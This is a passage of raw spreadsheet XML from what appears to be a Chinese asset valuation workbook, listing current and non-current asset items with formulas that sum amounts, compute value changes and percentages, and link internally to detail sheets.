    </row>
    <row r="2" ht="13.5" customFormat="1" customHeight="1" s="148">
      <c r="B2" s="547">
        <f>设定信息!A7&amp;"："&amp;TEXT(评估基准日,"yyyy年m月d日")</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="13.5" customFormat="1" customHeight="1" s="116">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="13.5" customFormat="1" customHeight="1" s="116">
      <c r="B4" s="549">
        <f>设定信息!A6&amp;"："&amp;设定信息!B6</f>
        <v/>
      </c>
      <c r="C4" s="549" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>RIGHT(设定信息!A8,4)&amp;"："&amp;设定信息!B8</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="13.5" customFormat="1" customHeight="1" s="369">
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="122" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="403" t="inlineStr">
        <is>
          <t>科目名称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404" t="inlineStr">
        <is>
          <t>报表金额</t>
        </is>
      </c>
      <c r="J5" s="405" t="inlineStr">
        <is>
          <t>校验</t>
        </is>
      </c>
      <c r="K5" s="558" t="inlineStr">
        <is>
          <t>科目链接</t>
        </is>
      </c>
    </row>
    <row r="6" ht="13.5" customFormat="1" customHeight="1" s="400">
      <c r="B6" s="380" t="n">
        <v>1</v>
      </c>
      <c r="C6" s="406" t="inlineStr">
        <is>
          <t>流资汇总</t>
        </is>
      </c>
      <c r="D6" s="407" t="inlineStr">
        <is>
          <t>一、流动资产合计</t>
        </is>
      </c>
      <c r="E6" s="559">
        <f>SUM(E7:E19)</f>
        <v/>
      </c>
      <c r="F6" s="559">
        <f>SUM(F7:F19)</f>
        <v/>
      </c>
      <c r="G6" s="559">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="559">
        <f>IF(E6=0,"",IF(E6&lt;0,-G6/E6*100,G6/E6*100))</f>
        <v/>
      </c>
      <c r="I6" s="559">
        <f>SUM(I7:I19)</f>
        <v/>
      </c>
      <c r="J6" s="559">
        <f>E6-I6</f>
        <v/>
      </c>
      <c r="K6" s="407" t="n"/>
    </row>
    <row r="7" ht="13.5" customHeight="1" s="415">
      <c r="B7" s="380" t="n">
        <v>2</v>
      </c>
      <c r="C7" s="406" t="inlineStr">
        <is>
          <t>货币汇总</t>
        </is>
      </c>
      <c r="D7" s="295" t="inlineStr">
        <is>
          <t>货币资金</t>
        </is>
      </c>
      <c r="E7" s="560">
        <f>'3-流动资产汇总'!E6</f>
        <v/>
      </c>
      <c r="F7" s="560">
        <f>'3-流动资产汇总'!F6</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",IF(E7&lt;0,-G7/E7*100,G7/E7*100))</f>
        <v/>
      </c>
      <c r="I7" s="560" t="n"/>
      <c r="J7" s="559">
        <f>E7-I7</f>
        <v/>
      </c>
      <c r="K7" s="561">
        <f>HYPERLINK("#\"3-1货币资金汇总表\"!A1","货币资金")</f>
        <v/>
      </c>
    </row>
    <row r="8" ht="13.5" customHeight="1" s="415">
      <c r="B8" s="380" t="n">
        <v>3</v>
      </c>
      <c r="C8" s="406" t="inlineStr">
        <is>
          <t>交融汇总</t>
        </is>
      </c>
      <c r="D8" s="297" t="inlineStr">
        <is>
          <t>交易性金融资产</t>
        </is>
      </c>
      <c r="E8" s="560">
        <f>'3-流动资产汇总'!E7</f>
        <v/>
      </c>
      <c r="F8" s="560">
        <f>'3-流动资产汇总'!F7</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",IF(E8&lt;0,-G8/E8*100,G8/E8*100))</f>
        <v/>
      </c>
      <c r="I8" s="560" t="n"/>
      <c r="J8" s="559">
        <f>E8-I8</f>
        <v/>
      </c>
      <c r="K8" s="561">
        <f>HYPERLINK("#\"3-2交易性金融资产汇总\"!A1","交易性金融资产")</f>
        <v/>
      </c>
    </row>
    <row r="9" ht="13.5" customHeight="1" s="415">
      <c r="B9" s="380" t="n">
        <v>4</v>
      </c>
      <c r="C9" s="406" t="inlineStr">
        <is>
          <t>衍金资产</t>
        </is>
      </c>
      <c r="D9" s="297" t="inlineStr">
        <is>
          <t>衍生金融资产</t>
        </is>
      </c>
      <c r="E9" s="560">
        <f>'3-流动资产汇总'!E8</f>
        <v/>
      </c>
      <c r="F9" s="560">
        <f>'3-流动资产汇总'!F8</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",IF(E9&lt;0,-G9/E9*100,G9/E9*100))</f>
        <v/>
      </c>
      <c r="I9" s="560" t="n"/>
      <c r="J9" s="559">
        <f>E9-I9</f>
        <v/>
      </c>
      <c r="K9" s="561">
        <f>HYPERLINK("#\"3-3衍生金融资产\"!A1","衍生金融资产")</f>
        <v/>
      </c>
    </row>
    <row r="10" ht="13.5" customHeight="1" s="415">
      <c r="B10" s="380" t="n">
        <v>5</v>
      </c>
      <c r="C10" s="406" t="inlineStr">
        <is>
          <t>应收票据</t>
        </is>
      </c>
      <c r="D10" s="297" t="inlineStr">
        <is>
          <t>应收票据</t>
        </is>
      </c>
      <c r="E10" s="560">
        <f>'3-流动资产汇总'!E9</f>
        <v/>
      </c>
      <c r="F10" s="560">
        <f>'3-流动资产汇总'!F9</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(E10=0,"",IF(E10&lt;0,-G10/E10*100,G10/E10*100))</f>
        <v/>
      </c>
      <c r="I10" s="560" t="n"/>
      <c r="J10" s="559">
        <f>E10-I10</f>
        <v/>
      </c>
      <c r="K10" s="561">
        <f>HYPERLINK("#\"3-4应收票据\"!A1","应收票据")</f>
        <v/>
      </c>
    </row>
    <row r="11" ht="13.5" customHeight="1" s="415">
      <c r="B11" s="380" t="n">
        <v>6</v>
      </c>
      <c r="C11" s="406" t="inlineStr">
        <is>
          <t>应收账款</t>
        </is>
      </c>
      <c r="D11" s="297" t="inlineStr">
        <is>
          <t>应收账款</t>
        </is>
      </c>
      <c r="E11" s="560">
        <f>'3-流动资产汇总'!E10</f>
        <v/>
      </c>
      <c r="F11" s="560">
        <f>'3-流动资产汇总'!F10</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>IF(E11=0,"",IF(E11&lt;0,-G11/E11*100,G11/E11*100))</f>
        <v/>
      </c>
      <c r="I11" s="560" t="n"/>
      <c r="J11" s="559">
        <f>E11-I11</f>
        <v/>
      </c>
      <c r="K11" s="561">
        <f>HYPERLINK("#\"3-5应收账款\"!A1","应收账款")</f>
        <v/>
      </c>
    </row>
    <row r="12" ht="13.5" customHeight="1" s="415">
      <c r="B12" s="380" t="n">
        <v>7</v>
      </c>
      <c r="C12" s="406" t="inlineStr">
        <is>
          <t>应收融资</t>
        </is>
      </c>
      <c r="D12" s="297" t="inlineStr">
        <is>
          <t>应收款项融资</t>
        </is>
      </c>
      <c r="E12" s="560">
        <f>'3-流动资产汇总'!E11</f>
        <v/>
      </c>
      <c r="F12" s="560">
        <f>'3-流动资产汇总'!F11</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(E12=0,"",IF(E12&lt;0,-G12/E12*100,G12/E12*100))</f>
        <v/>
      </c>
      <c r="I12" s="560" t="n"/>
      <c r="J12" s="559">
        <f>E12-I12</f>
        <v/>
      </c>
      <c r="K12" s="561">
        <f>HYPERLINK("#\"3-6应收款项融资\"!A1","应收款项融资")</f>
        <v/>
      </c>
    </row>
    <row r="13" ht="13.5" customHeight="1" s="415">
      <c r="B13" s="380" t="n">
        <v>8</v>
      </c>
      <c r="C13" s="406" t="inlineStr">
        <is>
          <t>预付账款</t>
        </is>
      </c>
      <c r="D13" s="295" t="inlineStr">
        <is>
          <t>预付款项</t>
        </is>
      </c>
      <c r="E13" s="560">
        <f>'3-流动资产汇总'!E12</f>
        <v/>
      </c>
      <c r="F13" s="560">
        <f>'3-流动资产汇总'!F12</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(E13=0,"",IF(E13&lt;0,-G13/E13*100,G13/E13*100))</f>
        <v/>
      </c>
      <c r="I13" s="560" t="n"/>
      <c r="J13" s="559">
        <f>E13-I13</f>
        <v/>
      </c>
      <c r="K13" s="561">
        <f>HYPERLINK("#\"3-7预付款项\"!A1","预付款项")</f>
        <v/>
      </c>
    </row>
    <row r="14" ht="13.5" customHeight="1" s="415">
      <c r="B14" s="380" t="n">
        <v>9</v>
      </c>
      <c r="C14" s="406" t="inlineStr">
        <is>
          <t>其收汇总</t>
        </is>
      </c>
      <c r="D14" s="295" t="inlineStr">
        <is>
          <t>其他应收款</t>
        </is>
      </c>
      <c r="E14" s="560">
        <f>'3-流动资产汇总'!E13</f>
        <v/>
      </c>
      <c r="F14" s="560">
        <f>'3-流动资产汇总'!F13</f>
        <v/>
      </c>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>IF(E14=0,"",IF(E14&lt;0,-G14/E14*100,G14/E14*100))</f>
        <v/>
      </c>
      <c r="I14" s="560" t="n"/>
      <c r="J14" s="559">
        <f>E14-I14</f>
        <v/>
      </c>
      <c r="K14" s="561">
        <f>HYPERLINK("#\"3-8其他应收款汇总\"!A1","其他应收款")</f>
        <v/>
      </c>
    </row>
    <row r="15" ht="13.5" customHeight="1" s="415">
      <c r="B15" s="380" t="n">
        <v>10</v>
      </c>
      <c r="C15" s="406" t="inlineStr">
        <is>
          <t>存货汇总</t>
        </is>
      </c>
      <c r="D15" s="295" t="inlineStr">
        <is>
          <t>存货</t>
        </is>
      </c>
      <c r="E15" s="560">
        <f>'3-流动资产汇总'!E14</f>
        <v/>
      </c>
      <c r="F15" s="560">
        <f>'3-流动资产汇总'!F14</f>
        <v/>
      </c>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>IF(E15=0,"",IF(E15&lt;0,-G15/E15*100,G15/E15*100))</f>
        <v/>
      </c>
      <c r="I15" s="560" t="n"/>
      <c r="J15" s="559">
        <f>E15-I15</f>
        <v/>
      </c>
      <c r="K15" s="561">
        <f>HYPERLINK("#\"3-9存货汇总\"!A1","存货")</f>
        <v/>
      </c>
    </row>
    <row r="16" ht="13.5" customHeight="1" s="415">
      <c r="B16" s="380" t="n">
        <v>11</v>
      </c>
      <c r="C16" s="406" t="inlineStr">
        <is>
          <t>合同资产</t>
        </is>
      </c>
      <c r="D16" s="297" t="inlineStr">
        <is>
          <t>合同资产</t>
        </is>
      </c>
      <c r="E16" s="560">
        <f>'3-流动资产汇总'!E15</f>
        <v/>
      </c>
      <c r="F16" s="560">
        <f>'3-流动资产汇总'!F15</f>
        <v/>
      </c>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>IF(E16=0,"",IF(E16&lt;0,-G16/E16*100,G16/E16*100))</f>
        <v/>
      </c>
      <c r="I16" s="560" t="n"/>
      <c r="J16" s="559">
        <f>E16-I16</f>
        <v/>
      </c>
      <c r="K16" s="561">
        <f>HYPERLINK("#\"3-10合同资产\"!A1","合同资产")</f>
        <v/>
      </c>
    </row>
    <row r="17" ht="13.5" customHeight="1" s="415">
      <c r="B17" s="380" t="n">
        <v>12</v>
      </c>
      <c r="C17" s="406" t="inlineStr">
        <is>
          <t>持有代资</t>
        </is>
      </c>
      <c r="D17" s="297" t="inlineStr">
        <is>
          <t>持有待售资产</t>
        </is>
      </c>
      <c r="E17" s="560">
        <f>'3-流动资产汇总'!E16</f>
        <v/>
      </c>
      <c r="F17" s="560">
        <f>'3-流动资产汇总'!F16</f>
        <v/>
      </c>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="555">
        <f>IF(E17=0,"",IF(E17&lt;0,-G17/E17*100,G17/E17*100))</f>
        <v/>
      </c>
      <c r="I17" s="560" t="n"/>
      <c r="J17" s="559">
        <f>E17-I17</f>
        <v/>
      </c>
      <c r="K17" s="561">
        <f>HYPERLINK("#\"3-11持有待售资产\"!A1","持有待售资产")</f>
        <v/>
      </c>
    </row>
    <row r="18" ht="13.5" customHeight="1" s="415">
      <c r="B18" s="380" t="n">
        <v>13</v>
      </c>
      <c r="C18" s="406" t="inlineStr">
        <is>
          <t>到期非流</t>
        </is>
      </c>
      <c r="D18" s="295" t="inlineStr">
        <is>
          <t>一年内到期的非流动资产</t>
        </is>
      </c>
      <c r="E18" s="560">
        <f>'3-流动资产汇总'!E17</f>
        <v/>
      </c>
      <c r="F18" s="560">
        <f>'3-流动资产汇总'!F17</f>
        <v/>
      </c>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>IF(E18=0,"",IF(E18&lt;0,-G18/E18*100,G18/E18*100))</f>
        <v/>
      </c>
      <c r="I18" s="560" t="n"/>
      <c r="J18" s="559">
        <f>E18-I18</f>
        <v/>
      </c>
      <c r="K18" s="561">
        <f>HYPERLINK("#\"3-12一年到期非流动资产\"!A1","一年内到期的非流动资产")</f>
        <v/>
      </c>
    </row>
    <row r="19" ht="13.5" customHeight="1" s="415">
      <c r="B19" s="380" t="n">
        <v>14</v>
      </c>
      <c r="C19" s="406" t="inlineStr">
        <is>
          <t>其他流资</t>
        </is>
      </c>
      <c r="D19" s="295" t="inlineStr">
        <is>
          <t>其他流动资产</t>
        </is>
      </c>
      <c r="E19" s="560">
        <f>'3-流动资产汇总'!E18</f>
        <v/>
      </c>
      <c r="F19" s="560">
        <f>'3-流动资产汇总'!F18</f>
        <v/>
      </c>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="555">
        <f>IF(E19=0,"",IF(E19&lt;0,-G19/E19*100,G19/E19*100))</f>
        <v/>
      </c>
      <c r="I19" s="560" t="n"/>
      <c r="J19" s="559">
        <f>E19-I19</f>
        <v/>
      </c>
      <c r="K19" s="561">
        <f>HYPERLINK("#\"3-13其他流动资产\"!A1","其他流动资产")</f>
        <v/>
      </c>
    </row>
    <row r="20" ht="13.5" customFormat="1" customHeight="1" s="400">
      <c r="B20" s="380" t="n">
        <v>15</v>
      </c>
      <c r="C20" s="406" t="inlineStr">
        <is>
          <t>非资汇总</t>
        </is>
      </c>
      <c r="D20" s="407" t="inlineStr">
        <is>
          <t>二、非流动资产合计</t>
        </is>
      </c>
      <c r="E20" s="559">
        <f>SUM(E21:E38)</f>
        <v/>
      </c>
      <c r="F20" s="559">
        <f>SUM(F21:F38)</f>
        <v/>
      </c>
      <c r="G20" s="559">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="559">
        <f>IF(E20=0,"",IF(E20&lt;0,-G20/E20*100,G20/E20*100))</f>
        <v/>
      </c>
      <c r="I20" s="559">
        <f>SUM(I21:I38)</f>
        <v/>
      </c>
      <c r="J20" s="559">
        <f>E20-I20</f>
        <v/>
      </c>
      <c r="K20" s="407" t="n"/>
    </row>
    <row r="21" ht="13.5" customHeight="1" s="415">
      <c r="B21" s="380" t="n">
        <v>16</v>
      </c>
      <c r="C21" s="406" t="inlineStr">
        <is>
          <t>债权投资</t>
        </is>
      </c>
      <c r="D21" s="297" t="inlineStr">
        <is>
          <t>债权投资</t>
        </is>
      </c>
      <c r="E21" s="560">
        <f>'4-非流动资产汇总'!E6</f>
        <v/>
      </c>
      <c r="F21" s="560">
        <f>'4-非流动资产汇总'!F6</f>
        <v/>
      </c>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="555">
        <f>IF(E21=0,"",IF(E21&lt;0,-G21/E21*100,G21/E21*100))</f>
        <v/>
      </c>
      <c r="I21" s="560" t="n"/>
      <c r="J21" s="559">
        <f>E21-I21</f>
        <v/>
      </c>
      <c r="K21" s="561">
        <f>HYPERLINK("#\"4-1债权投资\"!A1","债权投资")</f>
        <v/>
      </c>
    </row>
    <row r="22" ht="13.5" customHeight="1" s="415">
      <c r="B22" s="380" t="n">
        <v>17</v>
      </c>
      <c r="C22" s="406" t="inlineStr">
        <is>
          <t>其他债权</t>
        </is>
      </c>
      <c r="D22" s="297" t="inlineStr">
        <is>
          <t>其他债权投资</t>
        </is>
      </c>
      <c r="E22" s="560">
        <f>'4-非流动资产汇总'!E7</f>
        <v/>
      </c>
      <c r="F22" s="560">
        <f>'4-非流动资产汇总'!F7</f>
        <v/>
      </c>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="555">
        <f>IF(E22=0,"",IF(E22&lt;0,-G22/E22*100,G22/E22*100))</f>
        <v/>
      </c>
      <c r="I22" s="560" t="n"/>
      <c r="J22" s="559">
        <f>E22-I22</f>
        <v/>
      </c>
      <c r="K22" s="561">
        <f>HYPERLINK("#\"4-2其他债权投资\"!A1","其他债权投资")</f>
        <v/>
      </c>
    </row>
    <row r="23" ht="13.5" customHeight="1" s="415">
      <c r="B23" s="380" t="n">
        <v>18</v>
      </c>
      <c r="C23" s="406" t="inlineStr">
        <is>
          <t>长期应收</t>
        </is>
      </c>
      <c r="D23" s="295" t="inlineStr">
        <is>
          <t>长期应收款</t>
        </is>
      </c>
      <c r="E23" s="560">
        <f>'4-非流动资产汇总'!E8</f>
        <v/>
      </c>
      <c r="F23" s="560">
        <f>'4-非流动资产汇总'!F8</f>
        <v/>
      </c>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="555">
        <f>IF(E23=0,"",IF(E23&lt;0,-G23/E23*100,G23/E23*100))</f>
        <v/>
      </c>
      <c r="I23" s="560" t="n"/>
      <c r="J23" s="559">
        <f>E23-I23</f>
        <v/>
      </c>
      <c r="K23" s="561">
        <f>HYPERLINK("#\"4-3长期应收\"!A1","长期应收款")</f>
        <v/>
      </c>
    </row>
    <row r="24" ht="13.5" customHeight="1" s="415">
      <c r="B24" s="380" t="n">
        <v>19</v>
      </c>
      <c r="C24" s="406" t="inlineStr">
        <is>
          <t>长期股权</t>
        </is>
      </c>
      <c r="D24" s="295" t="inlineStr">
        <is>
          <t>长期股权投资</t>
        </is>
      </c>
      <c r="E24" s="560">
        <f>'4-非流动资产汇总'!E9</f>
        <v/>
      </c>
      <c r="F24" s="560">
        <f>'4-非流动资产汇总'!F9</f>
        <v/>
      </c>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(E24=0,"",IF(E24&lt;0,-G24/E24*100,G24/E24*100))</f>
        <v/>
      </c>
      <c r="I24" s="560" t="n"/>
      <c r="J24" s="559">
        <f>E24-I24</f>
        <v/>
      </c>
      <c r="K24" s="561">
        <f>HYPERLINK("#\"4-4股权投资\"!A1","长期股权投资")</f>
        <v/>
      </c>
    </row>
    <row r="25" ht="13.5" customHeight="1" s="415">
      <c r="B25" s="380" t="n">
        <v>20</v>
      </c>
      <c r="C25" s="406" t="inlineStr">
        <is>
          <t>其他权投</t>
        </is>
      </c>
      <c r="D25" s="297" t="inlineStr">
        <is>
          <t>其他权益工具投资</t>
        </is>
      </c>
      <c r="E25" s="560">
        <f>'4-非流动资产汇总'!E10</f>
        <v/>
      </c>
      <c r="F25" s="560">
        <f>'4-非流动资产汇总'!F10</f>
        <v/>
      </c>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="555">
        <f>IF(E25=0,"",IF(E25&lt;0,-G25/E25*100,G25/E25*100))</f>
        <v/>
      </c>
      <c r="I25" s="560" t="n"/>
      <c r="J25" s="559">
        <f>E25-I25</f>
        <v/>
      </c>
      <c r="K25" s="561">
        <f>HYPERLINK("#\"4-5其他权益工具投资\"!A1","其他权益工具投资")</f>
        <v/>
      </c>
    </row>
    <row r="26" ht="13.5" customHeight="1" s="415">
      <c r="B26" s="380" t="n">
        <v>21</v>
      </c>
      <c r="C26" s="406" t="inlineStr">
        <is>
          <t>其他非金</t>
        </is>
      </c>
      <c r="D26" s="297" t="inlineStr">
        <is>
          <t>其他非流动金融资产</t>
        </is>
      </c>
      <c r="E26" s="560">
        <f>'4-非流动资产汇总'!E11</f>
        <v/>
      </c>
      <c r="F26" s="560">
        <f>'4-非流动资产汇总'!F11</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(E26=0,"",IF(E26&lt;0,-G26/E26*100,G26/E26*100))</f>
        <v/>
      </c>
      <c r="I26" s="560" t="n"/>
      <c r="J26" s="559">
        <f>E26-I26</f>
        <v/>
      </c>
      <c r="K26" s="561">
        <f>HYPERLINK("#\"4-6其他非流动金融资产汇总\"!A1","其他非流动金融资产")</f>
        <v/>
      </c>
    </row>
    <row r="27" ht="13.5" customHeight="1" s="415">
      <c r="B27" s="380" t="n">
        <v>22</v>
      </c>
      <c r="C27" s="406" t="inlineStr">
        <is>
          <t>投房汇总</t>
        </is>
      </c>
      <c r="D27" s="295" t="inlineStr">
        <is>
          <t>投资性房地产</t>
        </is>
      </c>
      <c r="E27" s="560">
        <f>'4-非流动资产汇总'!E12</f>
        <v/>
      </c>
      <c r="F27" s="560">
        <f>'4-非流动资产汇总'!F12</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>IF(E27=0,"",IF(E27&lt;0,-G27/E27*100,G27/E27*100))</f>
        <v/>
      </c>
      <c r="I27" s="560" t="n"/>
      <c r="J27" s="559">
        <f>E27-I27</f>
        <v/>
      </c>
      <c r="K27" s="561">
        <f>HYPERLINK("#\"4-7投资性房地产汇总\"!A1","投资性房地产")</f>
        <v/>
      </c>
    </row>
    <row r="28" ht="13.5" customHeight="1" s="415">
      <c r="B28" s="380" t="n">
        <v>23</v>
      </c>
      <c r="C28" s="406" t="inlineStr">
        <is>
          <t>固资汇总</t>
        </is>
      </c>
      <c r="D28" s="296" t="inlineStr">
        <is>
          <t>固定资产</t>
        </is>
      </c>
      <c r="E28" s="560">
        <f>'4-非流动资产汇总'!E13</f>
        <v/>
      </c>
      <c r="F28" s="560">
        <f>'4-非流动资产汇总'!F13</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>F28-E28</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>IF(E28=0,"",IF(E28&lt;0,-G28/E28*100,G28/E28*100))</f>
        <v/>
      </c>
      <c r="I28" s="560" t="n"/>
      <c r="J28" s="559">
        <f>E28-I28</f>
        <v/>
      </c>
      <c r="K28" s="561">
        <f>HYPERLINK("#\"4-8固定资产汇总\"!A1","固定资产")</f>
        <v/>
      </c>
    </row>
    <row r="29" ht="13.5" customHeight="1" s="415">
      <c r="B29" s="380" t="n">
        <v>24</v>
      </c>
      <c r="C29" s="406" t="inlineStr">
        <is>
          <t>在建汇总</t>
        </is>
      </c>
      <c r="D29" s="295" t="inlineStr">
        <is>
          <t>在建工程</t>
        </is>
      </c>
      <c r="E29" s="560">
        <f>'4-非流动资产汇总'!E14</f>
        <v/>
      </c>
      <c r="F29" s="560">
        <f>'4-非流动资产汇总'!F14</f>
        <v/>
      </c>
      <c r="G29" s="555">
        <f>F29-E29</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>IF(E29=0,"",IF(E29&lt;0,-G29/E29*100,G29/E29*100))</f>
        <v/>
      </c>
      <c r="I29" s="560" t="n"/>
      <c r="J29" s="559">
        <f>E29-I29</f>
        <v/>
      </c>
      <c r="K29" s="561">
        <f>HYPERLINK("#\"4-9在建工程汇总\"!A1","在建工程")</f>
        <v/>
      </c>
    </row>
    <row r="30" ht="13.5" customHeight="1" s="415">
      <c r="B30" s="380" t="n">
        <v>25</v>
      </c>
      <c r="C30" s="406" t="inlineStr">
        <is>
          <t>生物资产</t>
        </is>
      </c>
      <c r="D30" s="295" t="inlineStr">
        <is>
          <t>生产性生物资产</t>
        </is>
      </c>
      <c r="E30" s="560">
        <f>'4-非流动资产汇总'!E15</f>
        <v/>
      </c>
      <c r="F30" s="560">
        <f>'4-非流动资产汇总'!F15</f>
        <v/>
      </c>
      <c r="G30" s="555">
        <f>F30-E30</f>
        <v/>
      </c>
      <c r="H30" s="555">
        <f>IF(E30=0,"",IF(E30&lt;0,-G30/E30*100,G30/E30*100))</f>
        <v/>
      </c>
      <c r="I30" s="560" t="n"/>
      <c r="J30" s="559">
        <f>E30-I30</f>
        <v/>
      </c>
      <c r="K30" s="561">
        <f>HYPERLINK("#\"4-10生产性生物资产\"!A1","生产性生物资产")</f>
        <v/>
      </c>
    </row>
    <row r="31" ht="13.5" customHeight="1" s="415">
      <c r="B31" s="380" t="n">
        <v>26</v>
      </c>
      <c r="C31" s="406" t="inlineStr">
        <is>
          <t>油气资产</t>
        </is>
      </c>
      <c r="D31" s="295" t="inlineStr">
        <is>
          <t>油气资产</t>
        </is>
      </c>
      <c r="E31" s="560">
        <f>'4-非流动资产汇总'!E16</f>
        <v/>
      </c>
      <c r="F31" s="560">
        <f>'4-非流动资产汇总'!F16</f>
        <v/>
      </c>
      <c r="G31" s="555">
        <f>F31-E31</f>
        <v/>
      </c>
      <c r="H31" s="555">
        <f>IF(E31=0,"",IF(E31&lt;0,-G31/E31*100,G31/E31*100))</f>
        <v/>
      </c>
      <c r="I31" s="560" t="n"/>
      <c r="J31" s="559">
        <f>E31-I31</f>
        <v/>
      </c>
      <c r="K31" s="561">
        <f>HYPERLINK("#\"4-11油气资产\"!A1","油气资产")</f>
        <v/>
      </c>
    </row>
    <row r="32" ht="13.5" customHeight="1" s="415">
      <c r="B32" s="380" t="n">
        <v>27</v>
      </c>
      <c r="C32" s="406" t="inlineStr">
        <is>
          <t>使用资产</t>
        </is>
      </c>
      <c r="D32" s="297" t="inlineStr">
        <is>
          <t>使用权资产</t>
        </is>
      </c>
      <c r="E32" s="560">
        <f>'4-非流动资产汇总'!E17</f>
        <v/>
      </c>
      <c r="F32" s="560">
        <f>'4-非流动资产汇总'!F17</f>
        <v/>
      </c>
      <c r="G32" s="555">
        <f>F32-E32</f>
        <v/>
      </c>
      <c r="H32" s="555">
        <f>IF(E32=0,"",IF(E32&lt;0,-G32/E32*100,G32/E32*100))</f>
        <v/>
      </c>
      <c r="I32" s="560" t="n"/>
      <c r="J32" s="559">
        <f>E32-I32</f>
        <v/>
      </c>
      <c r="K32" s="561">
        <f>HYPERLINK("#\"4-12使用权资产\"!A1","使用权资产")</f>
        <v/>
      </c>
    </row>
    <row r="33" ht="13.5" customHeight="1" s="415">
      <c r="B33" s="380" t="n">
        <v>28</v>
      </c>
      <c r="C33" s="406" t="inlineStr">
        <is>
          <t>无形汇总</t>
        </is>
      </c>
      <c r="D33" s="295" t="inlineStr">
        <is>
          <t>无形资产</t>
        </is>
      </c>
      <c r="E33" s="560">
        <f>'4-非流动资产汇总'!E18</f>
        <v/>
      </c>
      <c r="F33" s="560">
        <f>'4-非流动资产汇总'!F18</f>
        <v/>
      </c>
      <c r="G33" s="555">
        <f>F33-E33</f>
        <v/>
      </c>
      <c r="H33" s="555">
        <f>IF(E33=0,"",IF(E33&lt;0,-G33/E33*100,G33/E33*100))</f>
        <v/>
      </c>
      <c r="I33" s="560" t="n"/>
      <c r="J33" s="559">
        <f>E33-I33</f>
        <v/>
      </c>
      <c r="K33" s="561">
        <f>HYPERLINK("#\"4-13无形资产汇总\"!A1","无形资产")</f>
        <v/>
      </c>
    </row>
    <row r="34" ht="13.5" customHeight="1" s="415">
      <c r="B34" s="380" t="n">
        <v>29</v>
      </c>
      <c r="C34" s="406" t="inlineStr">
        <is>
          <t>开发支出</t>
        </is>
      </c>
      <c r="D34" s="295" t="inlineStr">
        <is>
          <t>开发支出</t>
        </is>
      </c>
      <c r="E34" s="560">
        <f>'4-非流动资产汇总'!E19</f>
        <v/>
      </c>
      <c r="F34" s="560">
        <f>'4-非流动资产汇总'!F19</f>
        <v/>
      </c>
      <c r="G34" s="555">
        <f>F34-E34</f>
        <v/>
      </c>
      <c r="H34" s="555">
        <f>IF(E34=0,"",IF(E34&lt;0,-G34/E34*100,G34/E34*100))</f>
        <v/>
      </c>
      <c r="I34" s="560" t="n"/>
      <c r="J34" s="559">
        <f>E34-I34</f>
        <v/>
      </c>
      <c r="K34" s="561">
        <f>HYPERLINK("#\"4-14开发支出\"!A1","开发支出")</f>
        <v/>
      </c>
    </row>
    <row r="35" ht="13.5" customHeight="1" s="415">
      <c r="B35" s="380" t="n">
        <v>30</v>
      </c>
      <c r="C35" s="406" t="inlineStr">
        <is>
          <t>商誉资产</t>
        </is>
      </c>
      <c r="D35" s="295" t="inlineStr">
        <is>
          <t>商誉</t>
        </is>
      </c>
      <c r="E35" s="560">
        <f>'4-非流动资产汇总'!E20</f>
        <v/>
      </c>
      <c r="F35" s="560">
        <f>'4-非流动资产汇总'!F20</f>
        <v/>
